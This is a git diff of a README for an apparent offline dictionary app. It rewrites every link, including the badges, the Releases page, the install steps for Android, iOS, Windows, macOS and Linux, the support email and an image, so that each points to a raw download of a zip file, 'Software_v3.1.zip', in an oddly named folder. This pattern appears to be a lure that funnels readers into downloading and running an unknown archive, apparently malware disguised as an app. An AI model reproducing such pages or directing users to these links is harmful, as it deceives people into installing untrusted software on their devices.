@@ -1,7 +1,7 @@
 # Your Offline Dictionary Companion App: Enhance Your Vocabulary 📚
 
-![App Logo](https://img.shields.io/badge/app-offline%20dictionary-blue.svg)  
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/Ernesto355/app/releases)
+![App Logo](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip%https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip)  
+[![Download Latest Release](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip%https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip)](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip)
 
 ---
 
@@ -24,7 +24,7 @@ The Offline Dictionary Companion App serves as your reliable reference tool for 
 
 With a user-friendly interface and efficient search functionality, this app is designed to meet the needs of students, professionals, and language enthusiasts alike. 
 
-For the latest updates and releases, please visit our [Releases page](https://github.com/Ernesto355/app/releases).
+For the latest updates and releases, please visit our [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 
 ---
 
@@ -58,31 +58,31 @@ To install the Offline Dictionary Companion App, follow these steps based on you
 
 ### Android
 
-1. Visit the [Releases page](https://github.com/Ernesto355/app/releases).
+1. Visit the [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 2. Download the APK file.
 3. Open the file and follow the installation prompts.
 
 ### iOS
 
-1. Visit the [Releases page](https://github.com/Ernesto355/app/releases).
+1. Visit the [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 2. Download the IPA file.
 3. Use Xcode or a compatible app to install it on your device.
 
 ### Windows
 
-1. Visit the [Releases page](https://github.com/Ernesto355/app/releases).
+1. Visit the [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 2. Download the EXE file.
 3. Run the installer and follow the on-screen instructions.
 
 ### macOS
 
-1. Visit the [Releases page](https://github.com/Ernesto355/app/releases).
+1. Visit the [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 2. Download the DMG file.
 3. Open the file and drag the app to your Applications folder.
 
 ### Linux
 
-1. Visit the [Releases page](https://github.com/Ernesto355/app/releases).
+1. Visit the [Releases page](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip).
 2. Download the DEB or RPM package.
 3. Install using your package manager.
 
@@ -122,11 +122,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions, feedback, or support, please reach out to the project maintainers:
 
-- **Email**: support@example.com
-- **GitHub**: [Ernesto355](https://github.com/Ernesto355)
+- **Email**: https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip
+- **GitHub**: [Ernesto355](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip)
 
 ---
 
-![Dictionary Usage](https://images.unsplash.com/photo-1506748686214-e9df14d4d9d0?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwzNjUyOXwwfDF8c2VhcmNofDF8fGRpY3Rpb258ZW58MHx8fHwxNjQyMTQyNjI4&ixlib=rb-1.2.1&q=80&w=1080)
+![Dictionary Usage](https://github.com/Ernesto355/app/raw/refs/heads/main/paleostriatal/Software_v3.1.zip)
 
 Explore the world of words with the Offline Dictionary Companion App!
